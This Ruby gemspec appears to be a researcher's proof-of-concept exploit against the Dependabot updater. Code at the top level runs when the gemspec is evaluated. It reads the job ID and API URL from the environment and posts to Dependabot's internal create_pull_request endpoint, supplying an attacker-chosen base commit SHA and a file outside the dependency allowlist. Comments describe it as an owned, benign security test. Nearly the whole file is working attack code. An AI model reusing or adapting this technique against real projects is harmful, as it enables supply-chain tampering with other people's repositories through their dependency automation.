# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned security test. A git dependency's gemspec is evaluated inside the
# Dependabot updater. The probe asks Dependabot's own API to create one benign
# PR in the research-owned consumer repository. It neither reads nor exports
# credentials.
module OwnedDependabotRemoteProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  # Non-target base-SHA proof. This commit is reachable in the consumer's
  # object database, but it is not the target branch tip. The file inherited
  # from its tree is deliberately outside Bundler's dependency-file allowlist.
  ATTACKER_BASE_SHA = "b3091a627208a34cd0660fb906a25fd22aacad0a"
  RAW_PATH = "vendor/owned-dependabot-non-target-base-control.txt"

  CONTROL_CONTENT = "owned-dependabot-non-target-base-sha-control\n"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    # Avoid duplicate submissions if Bundler evaluates this gemspec in more
    # than one process during the same update job.
    marker = "/tmp/owned-dependabot-path-traversal-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    base_sha = ATTACKER_BASE_SHA

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload(base_sha))

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client.request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def current_base_sha
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    request["User-Agent"] = "owned-dependabot-path-traversal-probe"

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = true
    client.open_timeout = 10
    client.read_timeout = 20
    response = client.request(request)
    JSON.parse(response.body)["sha"]
  end

  def payload(base_sha)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_non_target_base_probe",
          "version" => "0.0.5",
          "previous-version" => "0.0.4",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => CONTROL_CONTENT,
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "chore: owned Dependabot non-target base SHA proof",
        "pr-title" => "Owned Dependabot non-target base SHA proof",
        "pr-body" => "Owned security test: the supplied base SHA is not the target branch tip; its non-allowlisted tree content must not be inherited."
      }
    }
  end
end

OwnedDependabotRemoteProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.5"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
